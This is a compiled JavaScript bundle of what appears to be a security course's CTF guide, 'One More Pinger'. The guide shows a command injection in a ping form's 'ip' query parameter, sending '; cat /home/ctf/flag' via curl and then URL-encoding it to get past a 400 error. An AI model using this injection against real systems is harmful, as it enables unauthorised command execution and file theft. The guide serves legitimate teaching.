"use strict";(self.webpackChunkessentials_security=self.webpackChunkessentials_security||[]).push([[1174],{5680:(e,n,t)=>{t.d(n,{xA:()=>g,yg:()=>y});var r=t(6540);function i(e,n,t){return n in e?Object.defineProperty(e,n,{value:t,enumerable:!0,configurable:!0,writable:!0}):e[n]=t,e}function a(e,n){var t=Object.keys(e);if(Object.getOwnPropertySymbols){var r=Object.getOwnPropertySymbols(e);n&&(r=r.filter((function(n){return Object.getOwnPropertyDescriptor(e,n).enumerable}))),t.push.apply(t,r)}return t}function o(e){for(var n=1;n<arguments.length;n++){var t=null!=arguments[n]?arguments[n]:{};n%2?a(Object(t),!0).forEach((function(n){i(e,n,t[n])})):Object.getOwnPropertyDescriptors?Object.defineProperties(e,Object.getOwnPropertyDescriptors(t)):a(Object(t)).forEach((function(n){Object.defineProperty(e,n,Object.getOwnPropertyDescriptor(t,n))}))}return e}function l(e,n){if(null==e)return{};var t,r,i=function(e,n){if(null==e)return{};var t,r,i={},a=Object.keys(e);for(r=0;r<a.length;r++)t=a[r],n.indexOf(t)>=0||(i[t]=e[t]);return i}(e,n);if(Object.getOwnPropertySymbols){var a=Object.getOwnPropertySymbols(e);for(r=0;r<a.length;r++)t=a[r],n.indexOf(t)>=0||Object.prototype.propertyIsEnumerable.call(e,t)&&(i[t]=e[t])}return i}var s=r.createContext({}),p=function(e){var n=r.useContext(s),t=n;return e&&(t="function"==typeof e?e(n):o(o({},n),e)),t},g=function(e){var n=p(e.components);return r.createElement(s.Provider,{value:n},e.children)},c="mdxType",u={inlineCode:"code",wrapper:function(e){var n=e.children;return r.createElement(r.Fragment,{},n)}},m=r.forwardRef((function(e,n){var t=e.components,i=e.mdxType,a=e.originalType,s=e.parentName,g=l(e,["components","mdxType","originalType","parentName"]),c=p(t),m=i,y=c["".concat(s,".").concat(m)]||c[m]||u[m]||a;return t?r.createElement(y,o(o({ref:n},g),{},{components:t})):r.createElement(y,o({ref:n},g))}));function y(e,n){var t=arguments,i=n&&n.mdxType;if("string"==typeof e||i){var a=t.length,o=new Array(a);o[0]=m;var l={};for(var s in n)hasOwnProperty.call(n,s)&&(l[s]=n[s]);l.originalType=e,l[c]="string"==typeof e?e:i,o[1]=l;for(var p=2;p<a;p++)o[p]=t[p];return r.createElement.apply(null,o)}return r.createElement.apply(null,t)}m.displayName="MDXCreateElement"},9832:(e,n,t)=>{t.r(n),t.d(n,{assets:()=>s,contentTitle:()=>o,default:()=>u,frontMatter:()=>a,metadata:()=>l,toc:()=>p});var r=t(8168),i=(t(6540),t(5680));const a={},o="One More Pinger",l={unversionedId:"Demystifying the Web/Re-Discovering the Browser/Guides/One more Pinger/README",id:"Demystifying the Web/Re-Discovering the Browser/Guides/One more Pinger/README",title:"One More Pinger",description:"That was simple.",source:"@site/docs/Demystifying the Web/Re-Discovering the Browser/Guides/One more Pinger/README.md",sourceDirName:"Demystifying the Web/Re-Discovering the Browser/Guides/One more Pinger",slug:"/Demystifying the Web/Re-Discovering the Browser/Guides/One more Pinger/",permalink:"/essentials-security/15/Demystifying the Web/Re-Discovering the Browser/Guides/One more Pinger/",draft:!1,tags:[],version:"current",frontMatter:{},sidebar:"sidebar",previous:{title:"Readme",permalink:"/essentials-security/15/Demystifying the Web/Re-Discovering the Browser/Guides/Readme/"},next:{title:"Hacking the Web",permalink:"/essentials-security/15/Demystifying the Web/Hacking the Web/"}},s={},p=[],g={toc:p},c="wrapper";function u(e){let{components:n,...t}=e;return(0,i.yg)(c,(0,r.A)({},g,t,{components:n,mdxType:"MDXLayout"}),(0,i.yg)("h1",{id:"one-more-pinger"},"One More Pinger"),(0,i.yg)("p",null,"That was simple.\nNow it's time for a more difficult use case of query parameters.\nYes, it's \"Pinger\" again.\nBut this time, you'll solve it ",(0,i.yg)("strong",{parentName:"p"},"entirely from the terminal"),"."),(0,i.yg)("p",null,"First, get the HTML content of the website:"),(0,i.yg)("pre",null,(0,i.yg)("code",{parentName:"pre",className:"language-html"},'root@kali:~# curl http://141.85.224.70:8069/pinger\n\n<html>\n\n    <head>\n        <title>Pinger</title>\n    </head>\n\n    <h2>My purpose is simple: I check the availability of network hosts by pinging their IP. Use the text box below to give me an IP to ping.</h2>\n\n    <form action="/ping" method="get">\n        IP: <input type="text" name="ip"></br>\n        <input type="submit" value="Submit">\n    </form>\n\n\n</html>\n')),(0,i.yg)("p",null,"The IP is retrieved from the user via this ",(0,i.yg)("inlineCode",{parentName:"p"},"form"),":"),(0,i.yg)("pre",null,(0,i.yg)("code",{parentName:"pre",className:"language-html"},'<form action="/ping" method="get">\n    IP: <input type="text" name="ip"></br>\n    <input type="submit" value="Submit">\n</form>\n')),(0,i.yg)("p",null,"From here we get the following information:"),(0,i.yg)("ul",null,(0,i.yg)("li",{parentName:"ul"},'upon pressing "Submit", a ',(0,i.yg)("inlineCode",{parentName:"li"},"GET")," request is sent to ",(0,i.yg)("inlineCode",{parentName:"li"},"/ping")),(0,i.yg)("li",{parentName:"ul"},"the input we provide is set as the value of the key ",(0,i.yg)("inlineCode",{parentName:"li"},"ip"))),(0,i.yg)("p",null,"So a request URL that gets the flag would look like this:"),(0,i.yg)("pre",null,(0,i.yg)("code",{parentName:"pre",className:"language-console"},"GET /ping?ip=; cat /home/ctf/flag\n")),(0,i.yg)("p",null,"Let's try to do this with ",(0,i.yg)("inlineCode",{parentName:"p"},"curl"),":"),(0,i.yg)("pre",null,(0,i.yg)("code",{parentName:"pre",className:"language-console"},"root@kali:~# curl -v -G -d 'ip=; cat /home/ctf/flag' http://141.85.224.70:8069/ping\n*   Trying 141.85.224.70:8069...\n* TCP_NODELAY set\n* Connected to 141.85.224.70 (141.85.224.70) port 8069 (#0)\n> GET /ping?ip=; cat /home/ctf/flag HTTP/1.1\n> Host: 141.85.224.70:8069\n> User-Agent: curl/7.68.0\n> Accept: */*\n> \n* Mark bundle as not supporting multiuse\n< HTTP/1.1 400 Bad Request\n[...]\n")),(0,i.yg)("p",null,"Why does the request fail?\nLook at the request:"),(0,i.yg)("pre",null,(0,i.yg)("code",{parentName:"pre",className:"language-console"},"GET /ping?ip=; cat /home/ctf/flag HTTP/1.1\n")),(0,i.yg)("p",null,"The value of the query parameter ",(0,i.yg)("inlineCode",{parentName:"p"},"ip")," contains some forbidden characters: ",(0,i.yg)("inlineCode",{parentName:"p"},";"),", ",(0,i.yg)("inlineCode",{parentName:"p"},"/")," and space.\nWe need to send them encoded for URLs.\nFor this we use the ",(0,i.yg)("inlineCode",{parentName:"p"},"--data-urlencode")," parameter for ",(0,i.yg)("inlineCode",{parentName:"p"},"curl"),":"),(0,i.yg)("pre",null,(0,i.yg)("code",{parentName:"pre",className:"language-console"},"root@kali:~# curl -v -G --data-urlencode 'ip=; cat /home/ctf/flag' http://141.85.224.70:8069/ping\n*   Trying 141.85.224.70:8069...\n* TCP_NODELAY set\n* Connected to 141.85.224.70 (141.85.224.70) port 8069 (#0)\n> GET /ping?ip=%3B%20cat%20%2Fhome%2Fctf%2Fflag HTTP/1.1\n> Host: 141.85.224.70:8069\n> User-Agent: curl/7.68.0\n> Accept: */*\n> \n* Mark bundle as not supporting multiuse\n< HTTP/1.1 200 OK\n[...]\n")),(0,i.yg)("p",null,"Notice that now the value of ",(0,i.yg)("inlineCode",{parentName:"p"},"ip")," looks stranger: ",(0,i.yg)("inlineCode",{parentName:"p"},"ip=%3B%20cat%20%2Fhome%2Fctf%2Fflag"),":"),(0,i.yg)("ul",null,(0,i.yg)("li",{parentName:"ul"},(0,i.yg)("inlineCode",{parentName:"li"},"%3B")," is the URL encoding for ",(0,i.yg)("inlineCode",{parentName:"li"},";")),(0,i.yg)("li",{parentName:"ul"},(0,i.yg)("inlineCode",{parentName:"li"},"%20")," is the URL encoding for space"),(0,i.yg)("li",{parentName:"ul"},(0,i.yg)("inlineCode",{parentName:"li"},"%2F")," is the URL encoding for ",(0,i.yg)("inlineCode",{parentName:"li"},"/"))))}u.isMDXComponent=!0}}]);